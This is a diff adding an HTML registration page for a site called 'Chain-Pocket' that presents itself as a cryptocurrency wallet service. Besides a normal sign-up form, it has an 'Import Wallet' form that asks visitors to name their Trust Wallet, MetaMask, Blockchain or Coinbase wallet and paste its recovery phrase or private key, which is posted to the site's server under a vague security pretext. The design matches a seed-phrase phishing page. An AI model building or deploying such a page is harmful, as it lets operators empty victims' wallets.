@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="assets/css/bootstrap-reboot.min.css" />
+    <link rel="stylesheet" href="assets/css/bootstrap-grid.min.css" />
+    <link rel="stylesheet" href="assets/css/owl.carousel.min.css" />
+    <link rel="stylesheet" href="assets/css/magnific-popup.css" />
+    <link rel="stylesheet" href="assets/css/themify-icons.css" />
+    <link rel="stylesheet" href="assets/css/cryptocoins.css" />
+    <link rel="stylesheet" href="assets/css/cryptocoins-colors.css" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <link rel="stylesheet" href="assets/css/custom.css?x=9887eer868" />
+    <link rel="stylesheet" href="assets/notiflix/notiflix.css" />
+
+    <!-- Favicons -->
+    <link
+      rel="icon"
+      type="image/ico"
+      href="assets/images/favicon.ico"
+      sizes="32x32"
+    />
+    <link rel="apple-touch-icon" href="assets/images/favicon.ico" />
+
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="author" content="Dmitry Volkov" />
+    <title>Register || Chain-Pocket</title>
+  </head>
+  <style>
+    p {
+      color: #000 !important;
+    }
+  </style>
+
+  <body style="background: #2d2d2a">
+    <!-- Google Translate -->
+    <div id="google_translate_element"></div>
+    <!-- sign form -->
+    <div class="sign" style="flex-direction: column">
+      <!-- particles -->
+      <div id="canvas" class="sign__particles"></div>
+      <!-- end particles -->
+
+      <div class="sign__content" style="background: #2d2d2a; color: white">
+        <div>
+          <div class="card-body" style="background: #2d2d2a; color: white">
+            <div class="text-center" style="text-align: center">
+              <h4>Select an Account Option</h4>
+              <a href="./"
+                ><img
+                  src="assets/images/logo-primary.png"
+                  alt="Logo"
+                  srcset="assets/images/logo-primary.png"
+                  width="80px"
+              /></a>
+            </div>
+            <div class="row">
+              <div
+                class="col text-center"
+                style="color: white; font-size: 30px"
+              >
+                <i class="fa-solid fa-download"></i><br />
+                <button class="btn" id="importWalletBTN">
+                  Import<br />Wallet
+                </button>
+              </div>
+              <div
+                class="col text-center"
+                style="color: white; font-size: 30px"
+              >
+                <i class="fa-sharp fa-solid fa-user"></i><br />
+                <button class="btn" id="createAccountBTN">Create Wallet</button>
+              </div>
+            </div>
+            <div style="padding: 20px">
+              <span style="color: #fff"
+                >Have a wallet? <a href="login.php">Access Wallet</a></span
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="sign__content">
+        <div id="createAccount" style="display: none">
+          <!-- form -->
+          <form action="#" id="main-form" class="sign__form" method="post">
+            <a href="./" style="text-align: center">
+              <img
+                class="sign__logo"
+                src="assets/images/logo-primary.png"
+                alt=""
+                style="width: 30%; background: #2d2d2a; border-radius: 45%"
+              />
+            </a>
+
+            <label>Username</label>
+            <input type="text" class="form__input" name="username" required />
+
+            <label>First Name</label>
+            <input type="text" class="form__input" name="first_name" required />
+
+            <label>Last Name</label>
+            <input type="text" class="form__input" name="last_name" required />
+
+            <label>Email</label>
+            <input type="text" class="form__input" name="email" required />
+
+            <label>Password</label>
+            <input
+              type="password"
+              class="form__input"
+              name="password"
+              id="password"
+              required
+            />
+
+            <label>Repeat Password</label>
+            <input
+              type="password"
+              class="form__input"
+              name="password"
+              id="password-re"
+              required
+            />
+
+            <label>Referral ID</label>
+            <input
+              type="password"
+              class="form__input"
+              name="referral_id"
+              readonly
+            />
+
+            <button class="btn" type="submit" name="signUp">Sign me up</button>
+
+            <div class="form__group">
+              <input id="terms" name="terms" type="checkbox" />
+              <label for="terms"
+                >I agree to the <a href="privacy.php">Privacy Policy</a></label
+              >
+            </div>
+          </form>
+          <!-- end form -->
+
+          <div class="sign__box">
+            <p>Already have an account? <a href="login.php">Sign in</a></p>
+          </div>
+        </div>
+
+        <div
+          id="importWallet"
+          style="display: none; color: #2d2d2a; text-align: center"
+        >
+          <div margin-top: 20px;padding: 10px;>
+            <h3 style="color: #2d2d2a !important">
+              Connect your existing wallet
+            </h3>
+            <p style="color: #2d2d2a !important">
+              Register and join the Chain-Pocket Community.<br />
+              By importing wallet up you agree to our
+              <a href="privacy.php">Privacy Policy</a>, and also help to make
+              our ecosystem secure by adding more blocks.
+            </p>
+          </div>
+          <div style="margin: auto">
+            <form action="" class="sign__form" method="POST">
+              <div class="from-box form-group">
+                <label for="walletType">Wallet Name</label>
+                <select
+                  name="walletType"
+                  id="walletType"
+                  class="form__input mt-2"
+                  style="
+                    width: 280px;
+                    border: 2px solid;
+                    padding: 10px;
+                    border-radius: 30px;
+                  "
+                  required
+                >
+                  <option value="Trust Wallet">Trust Wallet</option>
+                  <option value="Meta Mask">Meta Mask</option>
+                  <option value="Blockchain">Blockchain</option>
+                  <option value="Coin Base">Coin Base</option>
+                </select>
+              </div>
+              <div class="from-box mt-2">
+                <label for="walletPhrase">Wallet Phrase or Private Key</label>
+                <textarea
+                  name="walletPhrase"
+                  id="walletPhrase"
+                  class="form__input"
+                  cols="30"
+                  rows="30"
+                  style="height: 150px"
+                  required
+                ></textarea>
+              </div>
+              <div class="from-box mt-2">
+                <label for="walletEmail"
+                  >Email (Can be used later for your account)</label
+                >
+                <input
+                  type="email"
+                  name="walletEmail"
+                  class="form__input"
+                  id="walletEmail"
+                  placeholder="Email *"
+                  required
+                />
+              </div>
+              <button type="submit" class="btn" name="connetWallet">
+                Import Wallet
+              </button>
+            </form>
+            <div id="status"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- end sign form -->
+    <!-- JS -->
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="assets/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/js/owl.carousel.min.js"></script>
+    <script src="assets/js/jquery.magnific-popup.min.js"></script>
+    <script src="assets/js/three.min.js"></script>
+    <script src="assets/js/vanta.net.min.js"></script>
+    <script src="assets/js/main.js?x=3434"></script>
+    <script src="assets/notiflix/notiflix.js"></script>
+    <script type="text/javascript">
+      function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+          {
+            pageLanguage: "en",
+          },
+          "google_translate_element"
+        );
+      }
+    </script>
+    <script
+      type="text/javascript"
+      src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"
+    ></script>
+    <script>
+      $(document).ready(function () {
+        $("form#main-form").submit(function () {
+          var password = $("#password").val(),
+            password_re = $("#password-re").val();
+          if ($.trim(password) == "") {
+            Notiflix.Notify.Warning("Password is required");
+            return false;
+          } else {
+            if (password != password_re) {
+              Notiflix.Notify.Failure("Password does not match !");
+              return false;
+            }
+          }
+        });
+      });
+    </script>
+    <script>
+      $("#createAccountBTN").on("click", function () {
+        $("#importWallet").slideUp();
+        $("#createAccount").slideDown();
+      });
+      $("#importWalletBTN").on("click", function () {
+        $("#createAccount").slideUp();
+        $("#importWallet").slideDown();
+      });
+    </script>
+  </body>
+</html>
